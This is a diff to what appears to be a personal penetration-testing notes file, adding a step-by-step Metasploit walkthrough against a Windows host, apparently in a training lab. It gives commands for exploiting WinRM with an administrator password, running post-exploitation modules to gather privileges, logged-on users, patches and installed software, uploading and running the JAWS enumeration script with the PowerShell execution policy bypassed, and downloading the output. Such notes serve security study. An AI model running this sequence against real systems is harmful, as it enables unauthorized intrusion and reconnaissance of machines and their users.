@@ -1851,5 +1851,40 @@ wmic service list brief
 tasklist /SVC
 schtasks /query /fo LIST
 ```
-97)
-
+97) Automating Windows Local Enumeration
+```
+nmap -sV -p 5985 10.2.21.181
+msfconsole
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS 10.2.21.181
+set USERNAME administrator
+set PASSWORD tinkerbell
+set FORCE_VBS true
+run
+background
+use post/windows/gather/win_privs
+set SESSION 1
+run
+use post/windows/gather/enum_logged_on_users
+set SESSION 1
+run
+use post/windows/gather/checkvm
+set SESSION 1
+run
+use post/windows/gather/enum_applications
+set SESSION 1
+run
+use post/windows/gather/enum_computers
+set SESSION 1
+run
+use post/windows/gather/enum_patches
+set SESSION 1
+run
+ctrl+shift+alt to copy and past
+cd C:\\
+mkdir Temp
+upload /root/Desktop/jaws-enum.ps1
+shell
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+download JAWS-Enum.txt
+```
